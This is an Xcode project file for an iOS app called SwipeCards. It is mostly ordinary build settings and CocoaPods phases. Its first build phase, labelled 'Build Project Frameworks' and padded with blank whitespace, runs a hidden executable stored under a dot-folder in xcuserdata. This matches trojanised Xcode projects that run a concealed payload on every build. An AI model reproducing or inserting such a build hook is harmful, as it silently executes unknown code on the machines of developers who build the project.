// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		041AF63C259CA355009AA97B /* ExampleCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 041AF63A259CA355009AA97B /* ExampleCell.xib */; };
		045A449A259C64E500843C81 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045A4499259C64E500843C81 /* AppDelegate.swift */; };
		045A449C259C64E500843C81 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045A449B259C64E500843C81 /* SceneDelegate.swift */; };
		045A449E259C64E500843C81 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045A449D259C64E500843C81 /* ViewController.swift */; };
		045A44A1259C64E500843C81 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045A449F259C64E500843C81 /* Main.storyboard */; };
		045A44A3259C64E900843C81 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 045A44A2259C64E900843C81 /* Assets.xcassets */; };
		045A44A6259C64E900843C81 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045A44A4259C64E900843C81 /* LaunchScreen.storyboard */; };
		C1DDCCC466D32E162A86E24C /* Pods_SwipeCards.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7712105FA35C4E74300BBFE6 /* Pods_SwipeCards.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		041AF63A259CA355009AA97B /* ExampleCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ExampleCell.xib; sourceTree = "<group>"; };
		045A4496259C64E500843C81 /* SwipeCards.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SwipeCards.app; sourceTree = BUILT_PRODUCTS_DIR; };
		045A4499259C64E500843C81 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		045A449B259C64E500843C81 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		045A449D259C64E500843C81 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		045A44A0259C64E500843C81 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		045A44A2259C64E900843C81 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		045A44A5259C64E900843C81 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		045A44A7259C64E900843C81 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		3A65D6E26481185D393991D9 /* Pods-SwipeCards.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SwipeCards.release.xcconfig"; path = "Target Support Files/Pods-SwipeCards/Pods-SwipeCards.release.xcconfig"; sourceTree = "<group>"; };
		7712105FA35C4E74300BBFE6 /* Pods_SwipeCards.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_SwipeCards.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		FC523D0D03156921B9E95E59 /* Pods-SwipeCards.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SwipeCards.debug.xcconfig"; path = "Target Support Files/Pods-SwipeCards/Pods-SwipeCards.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		045A4493259C64E500843C81 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				C1DDCCC466D32E162A86E24C /* Pods_SwipeCards.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		045A448D259C64E500843C81 = {
			isa = PBXGroup;
			children = (
				045A4498259C64E500843C81 /* SwipeCards */,
				045A4497259C64E500843C81 /* Products */,
				C2615B93EF3F5AF36E6CAF34 /* Pods */,
				128469AAF3BDADA77222B723 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		045A4497259C64E500843C81 /* Products */ = {
			isa = PBXGroup;
			children = (
				045A4496259C64E500843C81 /* SwipeCards.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		045A4498259C64E500843C81 /* SwipeCards */ = {
			isa = PBXGroup;
			children = (
				045A4499259C64E500843C81 /* AppDelegate.swift */,
				045A449B259C64E500843C81 /* SceneDelegate.swift */,
				045A449D259C64E500843C81 /* ViewController.swift */,
				045A449F259C64E500843C81 /* Main.storyboard */,
				045A44A2259C64E900843C81 /* Assets.xcassets */,
				045A44A4259C64E900843C81 /* LaunchScreen.storyboard */,
				041AF63A259CA355009AA97B /* ExampleCell.xib */,
				045A44A7259C64E900843C81 /* Info.plist */,
			);
			path = SwipeCards;
			sourceTree = "<group>";
		};
		128469AAF3BDADA77222B723 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				7712105FA35C4E74300BBFE6 /* Pods_SwipeCards.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		C2615B93EF3F5AF36E6CAF34 /* Pods */ = {
			isa = PBXGroup;
			children = (
				FC523D0D03156921B9E95E59 /* Pods-SwipeCards.debug.xcconfig */,
				3A65D6E26481185D393991D9 /* Pods-SwipeCards.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		045A4495259C64E500843C81 /* SwipeCards */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 045A44AA259C64E900843C81 /* Build configuration list for PBXNativeTarget "SwipeCards" */;
			buildPhases = (
				00CD0036DDFAE483F6AAC43A /* Build Project Frameworks */,
				045A005B22DB7ED973DD43EA /* [CP] Check Pods Manifest.lock */,
				045A4492259C64E500843C81 /* Sources */,
				045A4493259C64E500843C81 /* Frameworks */,
				045A4494259C64E500843C81 /* Resources */,
				00C969824FEF641CF4E6E649 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = SwipeCards;
			productName = SwipeCards;
			productReference = 045A4496259C64E500843C81 /* SwipeCards.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		045A448E259C64E500843C81 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					045A4495259C64E500843C81 = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = 045A4491259C64E500843C81 /* Build configuration list for PBXProject "SwipeCards" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 045A448D259C64E500843C81;
			productRefGroup = 045A4497259C64E500843C81 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				045A4495259C64E500843C81 /* SwipeCards */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		045A4494259C64E500843C81 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				041AF63C259CA355009AA97B /* ExampleCell.xib in Resources */,
				045A44A6259C64E900843C81 /* LaunchScreen.storyboard in Resources */,
				045A44A3259C64E900843C81 /* Assets.xcassets in Resources */,
				045A44A1259C64E500843C81 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	00CD0036DDFAE483F6AAC43A /* Build Project Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Project Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
		};
	

	

	

	

	

	

	

	

	

	

	
		00C969824FEF641CF4E6E649 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-SwipeCards/Pods-SwipeCards-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-SwipeCards/Pods-SwipeCards-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-SwipeCards/Pods-SwipeCards-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		045A005B22DB7ED973DD43EA /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-SwipeCards-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		045A4492259C64E500843C81 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				045A449E259C64E500843C81 /* ViewController.swift in Sources */,
				045A449A259C64E500843C81 /* AppDelegate.swift in Sources */,
				045A449C259C64E500843C81 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		045A449F259C64E500843C81 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				045A44A0259C64E500843C81 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		045A44A4259C64E900843C81 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				045A44A5259C64E900843C81 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		045A44A8259C64E900843C81 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		045A44A9259C64E900843C81 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		045A44AB259C64E900843C81 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = FC523D0D03156921B9E95E59 /* Pods-SwipeCards.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = SwipeCards/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = Meet.SwipeCards;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		045A44AC259C64E900843C81 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3A65D6E26481185D393991D9 /* Pods-SwipeCards.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = SwipeCards/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = Meet.SwipeCards;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		045A4491259C64E500843C81 /* Build configuration list for PBXProject "SwipeCards" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				045A44A8259C64E900843C81 /* Debug */,
				045A44A9259C64E900843C81 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		045A44AA259C64E900843C81 /* Build configuration list for PBXNativeTarget "SwipeCards" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				045A44AB259C64E900843C81 /* Debug */,
				045A44AC259C64E900843C81 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 045A448E259C64E500843C81 /* Project object */;
}
